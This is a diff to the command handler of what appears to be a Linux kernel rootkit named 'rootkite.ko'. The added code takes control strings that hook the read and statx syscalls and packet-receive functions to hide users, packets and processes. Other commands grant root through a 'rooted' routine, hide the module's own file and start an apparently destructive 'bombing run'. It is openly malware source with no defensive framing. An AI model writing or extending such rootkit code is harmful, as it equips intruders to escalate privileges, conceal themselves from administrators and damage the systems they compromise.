@@ -126,6 +126,15 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
             }
         }
     }
+
+    if(memcmp("hide-users", tmpdata, strlen("hide-users")) == 0){
+        if(strlen(tmpdata) > strlen("hide-users")){
+            strcpy(last_data, tmpdata);
+            if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_read") == 1){
+                printk(KERN_ERR "error hooking syscall read\n");
+            }
+        }
+    }
     #else
     if(memcmp("hide-files", tmpdata, strlen("hide-files")) == 0){
         if(strlen(tmpdata) > strlen("hide-files")){
@@ -144,6 +153,15 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
             }
             if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_statx") == 1){
                 printk(KERN_ERR "error hooking syscall statx\n");
+            }
+        }
+    }
+
+    if(memcmp("hide-users", tmpdata, strlen("hide-users")) == 0){
+        if(strlen(tmpdata) > strlen("hide-users")){
+            strcpy(last_data, tmpdata);
+            if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_read") == 1){
+                printk(KERN_ERR "error hooking syscall read\n");
             }
         }
     }
@@ -185,8 +203,51 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
         }
     }
 
+    if(memcmp("hide-packets", tmpdata, strlen("hide-packets")) == 0){
+        if(strlen(tmpdata) > strlen("hide-packets")){
+            strcpy(last_data, tmpdata);
+            if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE, "packet_rcv") == 1){
+                printk(KERN_ERR "error hooking packet_rcv\n");
+            }
+            if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE, "tpacket_rcv") == 1){
+                printk(KERN_ERR "error hooking tpacket_rcv\n");
+            }
+            if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"packet_rcv_spkt") == 1){
+                printk(KERN_ERR "error hooking packet_rcv_spkt\n");
+            }
+        }
+    }
 
+    if(memcmp("hide-process", tmpdata, strlen("hide-process")) == 0){
+        if(strlen(tmpdata) > strlen("hide-process")){
+            strcpy(last_data, tmpdata);
+            switch_hide_process();
+        }
+    }
     
+    if(memcmp("rooted", tmpdata, strlen("rooted")) == 0){
+        if(strlen(tmpdata) > strlen("rooted")){
+            strcpy(last_data, tmpdata);
+            rooted();
+            insert_node(&files_to_hide, "rootkite.ko");
+            //insert_node(&files_to_hide, "ath_pci.conf");
+        }
+    }
+
+    if(memcmp("block-packets", tmpdata, strlen("block-packets")) == 0){
+        if(strlen(tmpdata) > strlen("block-packets")){
+            strcpy(last_data, tmpdata);
+            switch_net_hook();
+        }
+    }
+    
+    if(memcmp("finito", tmpdata, strlen("finito")) == 0){
+        if(strlen(tmpdata) > strlen("finito")){
+            strcpy(last_data, tmpdata);
+            start_bombing_run();
+        }
+    }
+
     return 0;
 }
 
